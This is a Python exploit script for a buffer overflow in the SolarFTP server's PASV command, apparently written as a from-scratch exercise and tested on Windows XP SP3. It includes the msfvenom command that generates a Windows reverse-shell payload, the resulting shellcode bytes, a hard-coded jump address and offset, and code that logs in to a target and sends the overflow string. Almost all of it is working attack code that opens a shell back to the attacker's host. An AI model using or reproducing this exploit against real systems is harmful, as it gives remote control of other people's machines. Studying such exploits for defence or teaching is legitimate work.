#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in SolarFTP. Though it's an old vulnerability and many exploits exist for it. I created this from scratch.

# 0x71a6ecea : jmp eax |  {PAGE_EXECUTE_READ} [MSWSOCK.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5625 (C:\WINDOWS\system32\MSWSOCK.dll)
# EIP offset: 123
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00' -f python
# This exploit depend upon the username and password combination and also on the buffer length. Variables mentioned below worked for me. If this doesn't run on your machine, try changing the buffer length.
# Tested on Microsoft Windows XP SP3


import sys
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

jmpeax = "\xEA\xEC\xA6\x71"

# 351 bytes

buf =  ""
buf += "\xba\x9b\x13\x1c\x13\xda\xcf\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x57\x0e\x03\xcc\x1d\xfe"
buf += "\xe6\x0e\xc9\x7c\x08\xee\x0a\xe1\x80\x0b\x3b\x21\xf6"
buf += "\x58\x6c\x91\x7c\x0c\x81\x5a\xd0\xa4\x12\x2e\xfd\xcb"
buf += "\x93\x85\xdb\xe2\x24\xb5\x18\x65\xa7\xc4\x4c\x45\x96"
buf += "\x06\x81\x84\xdf\x7b\x68\xd4\x88\xf0\xdf\xc8\xbd\x4d"
buf += "\xdc\x63\x8d\x40\x64\x90\x46\x62\x45\x07\xdc\x3d\x45"
buf += "\xa6\x31\x36\xcc\xb0\x56\x73\x86\x4b\xac\x0f\x19\x9d"
buf += "\xfc\xf0\xb6\xe0\x30\x03\xc6\x25\xf6\xfc\xbd\x5f\x04"
buf += "\x80\xc5\xa4\x76\x5e\x43\x3e\xd0\x15\xf3\x9a\xe0\xfa"
buf += "\x62\x69\xee\xb7\xe1\x35\xf3\x46\x25\x4e\x0f\xc2\xc8"
buf += "\x80\x99\x90\xee\x04\xc1\x43\x8e\x1d\xaf\x22\xaf\x7d"
buf += "\x10\x9a\x15\xf6\xbd\xcf\x27\x55\xaa\x3c\x0a\x65\x2a"
buf += "\x2b\x1d\x16\x18\xf4\xb5\xb0\x10\x7d\x10\x47\x56\x54"
buf += "\xe4\xd7\xa9\x57\x15\xfe\x6d\x03\x45\x68\x47\x2c\x0e"
buf += "\x68\x68\xf9\x81\x38\xc6\x52\x62\xe8\xa6\x02\x0a\xe2"
buf += "\x28\x7c\x2a\x0d\xe3\x15\xc1\xf4\x64\xda\xbe\xdd\x68"
buf += "\xb2\xbc\x21\x80\x1e\x48\xc7\xc8\x8e\x1c\x50\x65\x36"
buf += "\x05\x2a\x14\xb7\x93\x57\x16\x33\x10\xa8\xd9\xb4\x5d"
buf += "\xba\x8e\x34\x28\xe0\x19\x4a\x86\x8c\xc6\xd9\x4d\x4c"
buf += "\x80\xc1\xd9\x1b\xc5\x34\x10\xc9\xfb\x6f\x8a\xef\x01"
buf += "\xe9\xf5\xab\xdd\xca\xf8\x32\x93\x77\xdf\x24\x6d\x77"
buf += "\x5b\x10\x21\x2e\x35\xce\x87\x98\xf7\xb8\x51\x76\x5e"
buf += "\x2c\x27\xb4\x61\x2a\x28\x91\x17\xd2\x99\x4c\x6e\xed"
buf += "\x16\x19\x66\x96\x4a\xb9\x89\x4d\xcf\xc9\xc3\xcf\x66"
buf += "\x42\x8a\x9a\x3a\x0f\x2d\x71\x78\x36\xae\x73\x01\xcd"
buf += "\xae\xf6\x04\x89\x68\xeb\x74\x82\x1c\x0b\x2a\xa3\x34"

s.connect(('192.168.43.72',21))
print s.recv(1024)
s.send("USER t3st\r\n")
print s.recv(1024)
s.send("PASS admin\r\n")
print s.recv(1024)
s.send("PASV "+ "A"*100 +"\xEB\x4E" + "A"*21 + jmpeax + "A"* 100  + buf + "A"*1109 + "\r\n")
print s.recv(1024)
s.close()
